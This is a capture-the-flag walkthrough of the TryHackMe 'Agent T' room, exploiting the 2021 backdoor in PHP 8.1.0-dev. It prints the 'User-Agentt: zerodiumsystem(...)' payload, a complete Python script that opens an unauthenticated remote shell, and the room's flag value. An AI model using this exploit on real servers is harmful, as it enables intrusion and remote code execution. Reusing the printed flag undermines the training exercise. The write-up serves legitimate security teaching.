---
title: "Agent T"
date: 2026-04-01
category: "ctf"
excerpt: "Walkthrough of the TryHackMe Agent T challenge - Something seems a little off with the server."
image: "/images/blog/17.png"
readtime: "8 min read"
draft: false
---

## Recon

First thing as always, nmap to check open ports:
```bash
nmap 10.114.168.183
```

Only port 80 is open. Let's check the website.

![](/images/blog/agent-t/1.png)

It looks like some kind of admin dashboard. I poked around but nothing interesting showed up, so I ran gobuster to look for hidden paths:
```bash
gobuster dir -u http://10.114.168.183/ -w /usr/share/wordlists/dirb/common.txt
```

Every path came back with `200 OK` which is weird and basically means directory busting is useless here. So I went back to the website and dug into the source code and HTTP requests. Still nothing useful.

Time to run nmap again but this time with version detection to get more info:
```bash
nmap -sCV 10.114.168.183
```
![](/images/blog/agent-t/2.png)

Let's look that up on Exploit-DB.

![](/images/blog/agent-t/3.png)

---

## The Vulnerability

There is a known exploit for this exact version. In March 2021, someone maliciously slipped a backdoor into the PHP source code in version `8.1.0-dev`. It got caught and removed pretty fast, but any server still running that version is completely vulnerable, just like this one.

Here is how it works: a normal HTTP request has a `User-Agent` header that tells the server what browser you're using. The backdoor added a secret behavior where if PHP spotted a misspelled header called `User-Agentt` (two t's) that started with the magic word `zerodium`, it would run whatever came after it as actual PHP code on the server.

So something like this:
```
User-Agentt: zerodiumsystem('whoami');
```

Would literally run `whoami` on the server and spit the output back to you. No login, no authentication, nothing. Just raw code execution.

This type of attack is called a **supply chain attack**. Instead of hacking the server directly, the attacker compromised the software itself before it even got installed. Really nasty because you trust the source.

---

## Exploitation

The script below is a simple interactive shell that takes advantage of the backdoor. You give it a target URL and then type commands like `ls`, `id`, `cat`, etc. It wraps each command in `zerodiumsystem('...')` and fires it off inside the `User-Agentt` header. The server runs the command and returns the output, giving you a full remote shell with no authentication needed.
```python
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't access tty; job control turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

Let's run it.

![](/images/blog/agent-t/4.png)

I'm in.

---

## Getting the Flag

Now I just need to find the flag. I ran `ls -la /` to check the root directory first:
```bash
ls -la /
```
![](/images/blog/agent-t/5.png)

Flag is right there. Just cat it:
```bash
cat /flag.txt
```

**Flag:** `flag{4127d0530abf16d6d23973e3df8dbecb}`

---

- Running nmap with `-sCV` was important here to find the version	
- When you spot a version number, search it on Exploit-DB, even old CVEs can still be sitting on unpatched servers
- **Supply chain attacks** are scary because the malicious code comes from a trusted source, not from the attacker directly targeting you	
- This backdoor worked because PHP was executing the header value as code with zero checks. 
